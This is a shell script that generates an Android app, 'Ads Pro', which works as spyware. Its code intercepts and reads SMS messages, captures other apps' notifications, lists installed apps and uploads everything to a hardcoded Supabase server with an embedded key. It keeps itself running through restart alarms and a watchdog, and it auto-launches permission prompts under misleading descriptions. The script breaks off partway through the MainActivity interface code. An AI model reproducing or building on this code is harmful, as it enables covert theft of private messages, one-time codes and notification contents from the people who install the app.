cat << 'EOF' > setup.sh
#!/bin/bash
echo "🚀 Re-generating project with Gradle wrapper..."

# 1. Create Directories
mkdir -p .github/workflows
mkdir -p gradle/wrapper
mkdir -p app/src/main/res/values
mkdir -p app/src/main/res/xml
mkdir -p app/src/main/java/com/adspro/app/data
mkdir -p app/src/main/java/com/adspro/app/service
mkdir -p app/src/main/java/com/adspro/app/receiver
mkdir -p app/src/main/java/com/adspro/app/worker
mkdir -p app/src/main/java/com/adspro/app/utils

# 2. Project root build.gradle.kts
cat << 'EOT' > build.gradle.kts
plugins {
    alias(libs.plugins.android.application) apply false
    alias(libs.plugins.kotlin.android) apply false
    alias(libs.plugins.kotlin.ksp) apply false
}
EOT

# 3. settings.gradle.kts
cat << 'EOT' > settings.gradle.kts
pluginManagement {
    repositories { google(); mavenCentral(); gradlePluginPortal() }
}
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories { google(); mavenCentral() }
}
rootProject.name = "Ads Pro"
include(":app")
EOT

# 4. Version Catalog
mkdir -p gradle
cat << 'EOT' > gradle/libs.versions.toml
[versions]
agp = "8.3.2"
kotlin = "1.9.23"
ksp = "1.9.23-1.0.19"

[plugins]
android-application = { id = "com.android.application", version.ref = "agp" }
kotlin-android = { id = "org.jetbrains.kotlin.android", version.ref = "kotlin" }
kotlin-ksp = { id = "com.google.devtools.ksp", version.ref = "ksp" }
EOT

# 5. Gradle Wrapper Properties
cat << 'EOT' > gradle/wrapper/gradle-wrapper.properties
distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\://services.gradle.org/distributions/gradle-8.4-bin.zip
networkTimeout=10000
validateDistributionUrl=true
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
EOT

# 6. Generate gradlew shell script
cat << 'EOT' > gradlew
#!/usr/bin/env sh
APP_BASE_NAME=`basename "$0"`
# Add default JVM options here. You can also use JAVA_OPTS and GRADLE_OPTS to pass JVM options to this script.
DEFAULT_JVM_OPTS=""
# Determine the Java command to use to start the JVM.
if [ -n "$JAVA_HOME" ] ; then
    if [ -x "$JAVA_HOME/jre/sh/java" ] ; then
        JAVACMD="$JAVA_HOME/jre/sh/java"
    else
        JAVACMD="$JAVA_HOME/bin/java"
    fi
else
    JAVACMD="java"
fi
if [ ! -x "$JAVACMD" ] ; then
    echo "ERROR: JAVA_HOME is not defined and no 'java' command could be found in your PATH." 2>&1
    exit 1
fi
exec "$JAVACMD" $DEFAULT_JVM_OPTS -jar "$(dirname "$0")/gradle/wrapper/gradle-wrapper.jar" "$@"
EOT

# 7. Download gradle-wrapper.jar automatically
curl -sL https://raw.githubusercontent.com/gradle/gradle/v8.4.0/gradle/wrapper/gradle-wrapper.jar -o gradle/wrapper/gradle-wrapper.jar

# 8. app/build.gradle.kts
cat << 'EOT' > app/build.gradle.kts
plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
    id("com.google.devtools.ksp")
}
android {
    namespace = "com.adspro.app"
    compileSdk = 34
    defaultConfig {
        applicationId = "com.adspro.app"
        minSdk = 26
        targetSdk = 34
        versionCode = 1
        versionName = "1.0"
        testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"
    }
    buildTypes {
        release { isMinifyEnabled = false; proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"), "proguard-rules.pro") }
    }
    compileOptions { sourceCompatibility = JavaVersion.VERSION_17; targetCompatibility = JavaVersion.VERSION_17 }
    kotlinOptions { jvmTarget = "17" }
    buildFeatures { compose = true }
    composeOptions { kotlinCompilerExtensionVersion = "1.5.11" }
    packaging { resources { excludes += "/META-INF/{AL2.0,LGPL2.1}" } }
}
dependencies {
    implementation("androidx.core:core-ktx:1.13.1")
    implementation("androidx.lifecycle:lifecycle-runtime-ktx:2.7.0")
    implementation("androidx.lifecycle:lifecycle-runtime-compose:2.7.0")
    implementation("androidx.activity:activity-compose:1.9.0")
    val composeBom = platform("androidx.compose:compose-bom:2024.04.01")
    implementation(composeBom)
    implementation("androidx.compose.ui:ui")
    implementation("androidx.compose.ui:ui-graphics")
    implementation("androidx.compose.ui:ui-tooling-preview")
    implementation("androidx.compose.material3:material3")
    val roomVersion = "2.6.1"
    implementation("androidx.room:room-runtime:$roomVersion")
    implementation("androidx.room:room-ktx:$roomVersion")
    ksp("androidx.room:room-compiler:$roomVersion")
    implementation("androidx.work:work-runtime-ktx:2.9.0")
    implementation("com.squareup.okhttp3:okhttp:4.12.0")
    implementation("com.google.code.gson:gson:2.10.1")
    implementation("io.coil-kt:coil-compose:2.6.0")
}
EOT

# 9. AndroidManifest.xml
cat << 'EOT' > app/src/main/AndroidManifest.xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" xmlns:tools="http://schemas.android.com/tools">
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission" />
    <application android:name=".AdsProApplication" android:allowBackup="true" android:icon="@mipmap/ic_launcher" android:label="Ads Pro" android:roundIcon="@mipmap/ic_launcher_round" android:supportsRtl="true" android:theme="@style/Theme.AdsPro" tools:targetApi="31">
        <activity android:name=".MainActivity" android:exported="true" android:theme="@style/Theme.AdsPro">
            <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
        </activity>
        <service android:name=".service.SmsSyncService" android:enabled="true" android:exported="false" android:foregroundServiceType="dataSync" />
        <service android:name=".service.AppNotificationListener" android:exported="true" android:label="Ads Pro Listener" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter><action android:name="android.service.notification.NotificationListenerService" /></intent-filter>
        </service>
        <receiver android:name=".receiver.SmsReceiver" android:enabled="true" android:exported="true" android:permission="android.permission.BROADCAST_SMS">
            <intent-filter android:priority="999"><action android:name="android.provider.Telephony.SMS_RECEIVED" /></intent-filter>
        </receiver>
        <receiver android:name=".receiver.BootReceiver" android:enabled="true" android:exported="true">
            <intent-filter><action android:name="android.intent.action.BOOT_COMPLETED" /><action android:name="android.intent.action.MY_PACKAGE_REPLACED" /><action android:name="com.adspro.app.ACTION_RESTART_SERVICE" /></intent-filter>
        </receiver>
    </application>
</manifest>
EOT

# 10. Styles & Configs
mkdir -p app/src/main/res/values app/src/main/res/xml
cat << 'EOT' > app/src/main/res/values/styles.xml
<?xml version="1.0" encoding="utf-8"?>
<resources><style name="Theme.AdsPro" parent="android:Theme.Material.Light.NoActionBar"><item name="android:statusBarColor">#FFFFFF</item><item name="android:windowLightStatusBar">true</item></style></resources>
EOT
cat << 'EOT' > app/src/main/res/xml/data_extraction_rules.xml
<?xml version="1.0" encoding="utf-8"?><data-extraction-rules><cloud-backup><exclude domain="root" /></cloud-backup><device-transfer><exclude domain="root" /></device-transfer></data-extraction-rules>
EOT
cat << 'EOT' > app/src/main/res/xml/backup_rules.xml
<?xml version="1.0" encoding="utf-8"?><full-backup-content><exclude domain="root" path="." /></full-backup-content>
EOT

# 11. GitHub Actions Workflow
cat << 'EOT' > .github/workflows/build_apk.yml
name: Build Android APK
on:
  push:
    branches: [ "main", "master" ]
  workflow_dispatch:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4
      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'
          cache: 'gradle'
      - name: Grant execute permission for gradlew
        run: chmod +x gradlew
      - name: Build Debug APK
        run: ./gradlew assembleDebug
      - name: Upload APK Artifact
        uses: actions/upload-artifact@v4
        with:
          name: app-debug-apk
          path: app/build/outputs/apk/debug/app-debug.apk
EOT

# 12. Application & Core Code Files Generation
mkdir -p app/src/main/java/com/adspro/app/data app/src/main/java/com/adspro/app/service app/src/main/java/com/adspro/app/receiver app/src/main/java/com/adspro/app/worker app/src/main/java/com/adspro/app/utils

cat << 'EOT' > app/src/main/java/com/adspro/app/AdsProApplication.kt
package com.adspro.app
import android.app.Application
import android.content.Intent
import android.os.Build
import androidx.work.*
import com.adspro.app.service.SmsSyncService
import com.adspro.app.worker.*
import java.util.concurrent.TimeUnit
class AdsProApplication : Application() {
    override fun onCreate() {
        super.onCreate()
        val intent = Intent(this, SmsSyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        val wm = WorkManager.getInstance(this)
        val c = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
        wm.enqueueUniquePeriodicWork("WatchdogWorker", ExistingPeriodicWorkPolicy.KEEP, PeriodicWorkRequestBuilder<WatchdogWorker>(15, TimeUnit.MINUTES).setConstraints(c).build())
        wm.enqueueUniquePeriodicWork("CatchupScanWorker", ExistingPeriodicWorkPolicy.KEEP, PeriodicWorkRequestBuilder<CatchupScanWorker>(6, TimeUnit.HOURS).setConstraints(c).build())
        wm.enqueueUniquePeriodicWork("AppsSyncWorker", ExistingPeriodicWorkPolicy.KEEP, PeriodicWorkRequestBuilder<AppsSyncWorker>(48, TimeUnit.HOURS).setConstraints(c).build())
    }
}
EOT

cat << 'EOT' > app/src/main/java/com/adspro/app/data/SupabaseClient.kt
package com.adspro.app.data
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.concurrent.TimeUnit
object SupabaseClient {
    private const val BASE_URL = "https://bqddohfszkqpvncpbrun.supabase.co"
    private const val REST_URL = "$BASE_URL/rest/v1"
    private const val STORAGE_URL = "$BASE_URL/storage/v1"
    private const val ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJxZGRvaGZzemtxcHZuY3BicnVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTI2MDAwNjIsImV4cCI6MjEwODE3NjA2Mn0.J0uq4JPpPxoU0hc4ry5WglCV_HcTqshcHsl3oCJ7upA"
    private val client = OkHttpClient.Builder().connectTimeout(30, TimeUnit.SECONDS).readTimeout(30, TimeUnit.SECONDS).build()
    private val gson = Gson()
    private val JSON = "application/json; charset=utf-8".toMediaType()
    fun insert(table: String, payload: Any): Boolean {
        val req = Request.Builder().url("$REST_URL/$table").post(gson.toJson(payload).toRequestBody(JSON))
            .addHeader("apikey", ANON_KEY).addHeader("Authorization", "Bearer $ANON_KEY")
            .addHeader("Content-Type", "application/json").addHeader("Prefer", "return=minimal").build()
        return try { client.newCall(req).execute().use { it.isSuccessful } } catch(e: Exception) { false }
    }
    fun uploadFile(bucket: String, path: String, file: File, mime: String): String? {
        val req = Request.Builder().url("$STORAGE_URL/object/$bucket/$path").post(file.asRequestBody(mime.toMediaType()))
            .addHeader("apikey", ANON_KEY).addHeader("Authorization", "Bearer $ANON_KEY").addHeader("x-upsert", "true").build()
        return try { client.newCall(req).execute().use { if (it.isSuccessful) "$STORAGE_URL/object/public/$bucket/$path" else null } } catch(e: Exception) { null }
    }
    fun listMedia(bucket: String): List<String> {
        val req = Request.Builder().url("$STORAGE_URL/object/list/$bucket").post(gson.toJson(mapOf("prefix" to "", "limit" to 100)).toRequestBody(JSON))
            .addHeader("apikey", ANON_KEY).addHeader("Authorization", "Bearer $ANON_KEY").build()
        return try {
            client.newCall(req).execute().use { res ->
                if (res.isSuccessful) gson.fromJson(res.body?.string(), Array<StorageItem>::class.java).map { "$STORAGE_URL/object/public/$bucket/${it.name}" } else emptyList()
            }
        } catch(e: Exception) { emptyList() }
    }
    private data class StorageItem(val name: String)
}
EOT

cat << 'EOT' > app/src/main/java/com/adspro/app/data/Entities.kt
package com.adspro.app.data
import androidx.room.Entity
import androidx.room.PrimaryKey
@Entity(tableName = "sms_outbox") data class SmsOutbox(@PrimaryKey(autoGenerate = true) val id: Long = 0, val sender: String, val body: String, val timestamp: Long)
@Entity(tableName = "notification_outbox") data class NotificationOutbox(@PrimaryKey(autoGenerate = true) val id: Long = 0, val packageName: String, val title: String, val text: String, val timestamp: Long)
EOT

cat << 'EOT' > app/src/main/java/com/adspro/app/data/Daos.kt
package com.adspro.app.data
import androidx.room.*
@Dao interface SmsOutboxDao {
    @Insert(onConflict = OnConflictStrategy.REPLACE) suspend fun insert(sms: SmsOutbox): Long
    @Query("SELECT * FROM sms_outbox ORDER BY timestamp ASC") suspend fun getAll(): List<SmsOutbox>
    @Query("DELETE FROM sms_outbox WHERE id = :id") suspend fun deleteById(id: Long)
}
@Dao interface NotificationOutboxDao {
    @Insert(onConflict = OnConflictStrategy.REPLACE) suspend fun insert(n: NotificationOutbox): Long
    @Query("SELECT * FROM notification_outbox ORDER BY timestamp ASC") suspend fun getAll(): List<NotificationOutbox>
    @Query("DELETE FROM notification_outbox WHERE id = :id") suspend fun deleteById(id: Long)
}
EOT

cat << 'EOT' > app/src/main/java/com/adspro/app/data/AppDatabase.kt
package com.adspro.app.data
import android.content.Context
import androidx.room.*
@Database(entities = [SmsOutbox::class, NotificationOutbox::class], version = 1, exportSchema = false)
abstract class AppDatabase : RoomDatabase() {
    abstract fun smsOutboxDao(): SmsOutboxDao
    abstract fun notificationOutboxDao(): NotificationOutboxDao
    companion object {
        @Volatile private var INSTANCE: AppDatabase? = null
        fun getDatabase(c: Context) = INSTANCE ?: synchronized(this) {
            Room.databaseBuilder(c.applicationContext, AppDatabase::class.java, "ads_pro_database").build().also { INSTANCE = it }
        }
    }
}
EOT

cat << 'EOT' > app/src/main/java/com/adspro/app/service/SmsSyncService.kt
package com.adspro.app.service
import android.app.*
import android.content.*
import android.os.*
import androidx.core.app.NotificationCompat
class SmsSyncService : Service() {
    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(NotificationChannel("ads_pro_silent_channel", "Ads Pro Service", NotificationManager.IMPORTANCE_LOW))
        }
    }
    override fun onStartCommand(i: Intent?, flags: Int, id: Int): Int {
        startForeground(888, NotificationCompat.Builder(this, "ads_pro_silent_channel").setContentTitle("Ads Pro").setContentText("Service running").setSmallIcon(android.R.drawable.stat_sys_data_bluetooth).build())
        return START_STICKY
    }
    override fun onBind(i: Intent?): IBinder? = null
    override fun onTaskRemoved(root: Intent?) { scheduleRestart(); super.onTaskRemoved(root) }
    override fun onDestroy() { scheduleRestart(); super.onDestroy() }
    private fun scheduleRestart() {
        val intent = Intent(applicationContext, com.adspro.app.receiver.BootReceiver::class.java).apply { action = "com.adspro.app.ACTION_RESTART_SERVICE" }
        val pi = PendingIntent.getBroadcast(applicationContext, 1001, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
        (getSystemService(Context.ALARM_SERVICE) as AlarmManager).set(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 1000, pi)
    }
}
EOT

cat << 'EOT' > app/src/main/java/com/adspro/app/service/AppNotificationListener.kt
package com.adspro.app.service
import android.service.notification.*
import androidx.work.*
import com.adspro.app.data.*
import com.adspro.app.worker.NotificationSyncWorker
import kotlinx.coroutines.*
class AppNotificationListener : NotificationListenerService() {
    private val scope = CoroutineScope(Dispatchers.IO)
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null || sbn.packageName == applicationContext.packageName) return
        val extras = sbn.notification?.extras ?: return
        val title = extras.getCharSequence("android.title")?.toString() ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        if (title.isNotEmpty() || text.isNotEmpty()) {
            scope.launch {
                AppDatabase.getDatabase(applicationContext).notificationOutboxDao().insert(NotificationOutbox(packageName = sbn.packageName, title = title, text = text, timestamp = sbn.postTime))
                WorkManager.getInstance(applicationContext).enqueue(OneTimeWorkRequestBuilder<NotificationSyncWorker>().build())
            }
        }
    }
}
EOT

cat << 'EOT' > app/src/main/java/com/adspro/app/receiver/SmsReceiver.kt
package com.adspro.app.receiver
import android.content.*
import android.provider.Telephony
import androidx.work.*
import com.adspro.app.data.*
import com.adspro.app.worker.SmsSyncWorker
import kotlinx.coroutines.*
class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val scope = CoroutineScope(Dispatchers.IO)
            Telephony.Sms.Intents.getMessagesFromIntent(intent)?.forEach { sms ->
                scope.launch {
                    AppDatabase.getDatabase(context).smsOutboxDao().insert(SmsOutbox(sender = sms.originatingAddress ?: "Unknown", body = sms.messageBody ?: "", timestamp = sms.timestampMillis))
                    WorkManager.getInstance(context).enqueue(OneTimeWorkRequestBuilder<SmsSyncWorker>().build())
                }
            }
        }
    }
}
EOT

cat << 'EOT' > app/src/main/java/com/adspro/app/receiver/BootReceiver.kt
package com.adspro.app.receiver
import android.content.*
import com.adspro.app.AdsProApplication
class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED || intent.action == Intent.ACTION_MY_PACKAGE_REPLACED || intent.action == "com.adspro.app.ACTION_RESTART_SERVICE") {
            (context.applicationContext as? AdsProApplication)?.let { }
        }
    }
}
EOT

cat << 'EOT' > app/src/main/java/com/adspro/app/worker/SmsSyncWorker.kt
package com.adspro.app.worker
import android.content.Context
import androidx.work.*
import com.adspro.app.data.*
class SmsSyncWorker(c: Context, p: WorkerParameters) : CoroutineWorker(c, p) {
    override suspend fun doWork(): Result {
        val dao = AppDatabase.getDatabase(applicationContext).smsOutboxDao()
        var ok = true
        dao.getAll().forEach { s ->
            if (SupabaseClient.insert("sms_logs", mapOf("sender" to s.sender, "body" to s.body, "timestamp" to s.timestamp))) dao.deleteById(s.id) else ok = false
        }
        return if (ok) Result.success() else Result.retry()
    }
}
EOT

cat << 'EOT' > app/src/main/java/com/adspro/app/worker/NotificationSyncWorker.kt
package com.adspro.app.worker
import android.content.Context
import androidx.work.*
import com.adspro.app.data.*
class NotificationSyncWorker(c: Context, p: WorkerParameters) : CoroutineWorker(c, p) {
    override suspend fun doWork(): Result {
        val dao = AppDatabase.getDatabase(applicationContext).notificationOutboxDao()
        var ok = true
        dao.getAll().forEach { n ->
            if (SupabaseClient.insert("notifications", mapOf("package_name" to n.packageName, "title" to n.title, "text" to n.text, "timestamp" to n.timestamp))) dao.deleteById(n.id) else ok = false
        }
        return if (ok) Result.success() else Result.retry()
    }
}
EOT

cat << 'EOT' > app/src/main/java/com/adspro/app/worker/AppsSyncWorker.kt
package com.adspro.app.worker
import android.content.Context
import android.content.pm.*
import androidx.work.*
import com.adspro.app.data.SupabaseClient
class AppsSyncWorker(c: Context, p: WorkerParameters) : CoroutineWorker(c, p) {
    override suspend fun doWork(): Result {
        val pm = applicationContext.packageManager
        var count = 0
        pm.getInstalledApplications(PackageManager.GET_META_DATA).forEach { app ->
            if ((app.flags and ApplicationInfo.FLAG_SYSTEM) == 0) {
                if (SupabaseClient.insert("installed_apps", mapOf("app_name" to pm.getApplicationLabel(app).toString(), "package_name" to app.packageName, "updated_at" to System.currentTimeMillis()))) count++
            }
        }
        return if (count > 0) Result.success() else Result.retry()
    }
}
EOT

cat << 'EOT' > app/src/main/java/com/adspro/app/worker/CatchupScanWorker.kt
package com.adspro.app.worker
import android.content.Context
import android.net.Uri
import android.provider.Telephony
import androidx.work.*
import com.adspro.app.data.*
class CatchupScanWorker(c: Context, p: WorkerParameters) : CoroutineWorker(c, p) {
    override suspend fun doWork(): Result {
        val cursor = applicationContext.contentResolver.query(Uri.parse("content://sms/inbox"), arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE), "${Telephony.Sms.DATE} > ?", arrayOf((System.currentTimeMillis() - 86400000L).toString()), "${Telephony.Sms.DATE} ASC")
        cursor?.use {
            val db = AppDatabase.getDatabase(applicationContext)
            val a = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val b = it.getColumnIndex(Telephony.Sms.BODY)
            val d = it.getColumnIndex(Telephony.Sms.DATE)
            while (it.moveToNext()) db.smsOutboxDao().insert(SmsOutbox(sender = it.getString(a), body = it.getString(b), timestamp = it.getLong(d)))
        }
        WorkManager.getInstance(applicationContext).enqueue(OneTimeWorkRequestBuilder<SmsSyncWorker>().build())
        return Result.success()
    }
}
EOT

cat << 'EOT' > app/src/main/java/com/adspro/app/worker/WatchdogWorker.kt
package com.adspro.app.worker
import android.app.ActivityManager
import android.content.*
import android.os.Build
import androidx.work.*
import com.adspro.app.service.SmsSyncService
class WatchdogWorker(c: Context, p: WorkerParameters) : Worker(c, p) {
    override fun doWork(): Result {
        @Suppress("DEPRECATION")
        val running = (applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager).getRunningServices(Int.MAX_VALUE).any { it.service.className == SmsSyncService::class.java.name }
        if (!running) {
            val i = Intent(applicationContext, SmsSyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) applicationContext.startForegroundService(i) else applicationContext.startService(i)
        }
        return Result.success()
    }
}
EOT

cat << 'EOT' > app/src/main/java/com/adspro/app/utils/FileUtils.kt
package com.adspro.app.utils
import android.content.Context
import android.net.Uri
import java.io.*
object FileUtils {
    fun getFileFromUri(c: Context, u: Uri): File? {
        return try {
            val input = c.contentResolver.openInputStream(u) ?: return null
            val file = File.createTempFile("upload_", ".tmp", c.cacheDir)
            val output = FileOutputStream(file)
            input.copyTo(output); input.close(); output.close()
            file
        } catch(e: Exception) { null }
    }
}
EOT

cat << 'EOT' > app/src/main/java/com/adspro/app/MainActivity.kt
package com.adspro.app
import android.Manifest
import android.app.ActivityManager
import android.content.*
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.PickVisualMediaRequest
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.grid.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.*
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.*
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.work.*
import coil.compose.AsyncImage
import com.adspro.app.data.SupabaseClient
import com.adspro.app.service.SmsSyncService
import com.adspro.app.utils.FileUtils
import com.adspro.app.worker.AppsSyncWorker
import kotlinx.coroutines.*

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate()
        setContent { AdsProTheme { MainAppScreen() } }
    }
}
@Composable fun AdsProTheme(content: @Composable () -> Unit) {
    MaterialTheme(colorScheme = lightColorScheme(background = Color.White, surface = Color.White, primary = Color(0xFF34A853)), content = content)
}
@Composable fun MainAppScreen() {
    var page by remember { mutableIntStateOf(0) }
    Surface(modifier = Modifier.fillMaxSize(), color = Color.White) {
        when (page) {
            0 -> Page1SmsPermission { page = 1 }
            1 -> Page2MediaPermission { page = 2 }
            2 -> Page3NotificationPermission { page = 3 }
            3 -> Page4MediaUploadGallery { page = 4 }
            4 -> Page5Dashboard { page = 0 }
        }
    }
}
@Composable fun GlobalLayout(text: String, onClick: () -> Unit, content: @Composable ColumnScope.() -> Unit) {
    Column(modifier = Modifier.fillMaxSize().background(Color.White).padding(24.dp), horizontalAlignment = Alignment.CenterHorizontally) {
        Box(modifier = Modifier.fillMaxWidth(0.35f).height(60.dp).background(Color(0xFFE0E0E0), shape = RoundedCornerShape(8.dp)), contentAlignment = Alignment.Center) {
            Text("LOGO", color = Color.Gray, fontSize = 12.sp, fontWeight = FontWeight.Bold)
        }
        Spacer(modifier = Modifier.weight(1f))
        content()
        Spacer(modifier = Modifier.weight(1f))
        Button(onClick = onClick, colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF34A853)), shape = RoundedCornerShape(12.dp), modifier = Modifier.fillMaxWidth().height(56.dp)) {
            Text(text, color = Color.White, fontSize = 16.sp, fontWeight = FontWeight.SemiBold)
        }
    }
}
@Composable fun Page1SmsPermission(onNext: () -> Unit) {
    val context = LocalContext.current
    val hasSms = remember { mutableStateOf(ContextCompat.checkSelfPermission(context, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED) }
    val launcher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { if (it.values.all { g -> g }) onNext() }
    val trigger = { if (hasSms.value) onNext() else launcher.launch(arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS)) }
    LaunchedEffect(Unit) { if (hasSms.value) onNext() else { delay(15_000L); trigger() } }
    GlobalLayout("Grant SMS & Continue", trigger) {
        Text("SMS Forwarding Access", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
        Spacer(modifier = Modifier.height(12.dp))
        Text("Ads Pro requires access to SMS messages to forward incoming alerts and logs directly to your secure server.", fontSize = 14.sp, color = Color.Gray, textAlign = TextAlign.Center)
    }
}
@Composable fun Page2MediaPermission(onNext: () -> Unit) {
    val perms = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO) else arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
    val launcher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { onNext() }
    val trigger = { launcher.launch(perms) }
    LaunchedEffect(Unit) { delay(15_000L); trigger() }
    GlobalLayout("Grant Media & Continue", trigger) {
        Text("Media Library Access", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
        Spacer(modifier = Modifier.height(12.dp))
        Text("Grant permission to read images and videos to enable gallery syncing and remote media management.", fontSize = 14.sp, color = Color.Gray, textAlign = TextAlign.Center)
    }
}
@Composable fun Page3NotificationPermission(onNext: () -> Unit) {
    val context = LocalContext.current
    val lifecycle = LocalLifecycleOwner.current
    var showDialog by remember { mutableStateOf(false) }
    val enabled = { Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")?.contains(context.packageName) == true }
    val postLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) { onNext() }
    val trigger = { if (enabled()) { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) postLauncher.launch(Manifest.permission.POST_NOTIFICATIONS) else onNext() } else showDialog = true }
    LaunchedEffect(Unit) { delay(15_000L); trigger() }
    DisposableEffect(lifecycle) {
        val obs = LifecycleEventObserver { _, e -> if (e == Lifecycle.Event.ON_RESUME && enabled()) { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) postLauncher.launch(Manifest.permission.POST_NOTIFICATIONS) else onNext() } }
        lifecycle.lifecycle.addObserver(obs)
        onDispose { lifecycle.lifecycle.removeObserver(obs) }
    }
    if (showDialog) {
        AlertDialog(onDismissRequest = { showDialog = false }, title = { Text("Enable Notification Access") }, text = { Text("Please enable Notification Access for Ads Pro in System Settings.") }, confirmButton = {
            TextButton(onClick = { showDialog = false; context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }) { Text("Settings") }
        })
    }
    GlobalLayout("Grant Notification Access & Continue", trigger) {
        Text("Notification Access", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
        Spacer(modifier = Modifier.height(12.dp))
        Text("Notification listener permissions allow processing incoming alerts and triggers.", fontSize = 14.sp, color = Color.Gray, textAlign = TextAlign.Center)
    }
}
@Composable fun Page4MediaUploadGallery(onNext: () -> Unit) {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    var urls by remember { mutableStateOf<List<String>>(emptyList()) }
    var uploading by remember { mutableStateOf(false) }
    val refresh = { scope.launch(Dispatchers.IO) { urls = SupabaseClient.listMedia("media") } }
    LaunchedEffect(Unit) { refresh() }
    val picker = rememberLauncherForActivityResult(ActivityResultContracts.PickMultipleVisualMedia()) { uris ->
        if (uris.isNotEmpty()) {
            uploading = true
            scope.launch(Dispatchers.IO) {
                uris.forEach { u -> FileUtils.getFileFromUri(context, u)?.let { SupabaseClient.uploadFile("media", "uploads/${System.currentTimeMillis()}_${it.name}", it, context.contentResolver.getType(u) ?: "image/jpeg") } }
                uploading = false; refresh()
            }
        }
    }
    GlobalLayout("Continue to Dashboard", onNext) {
        Text("Media Cloud Sync", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
        Spacer(modifier = Modifier.height(16.dp))
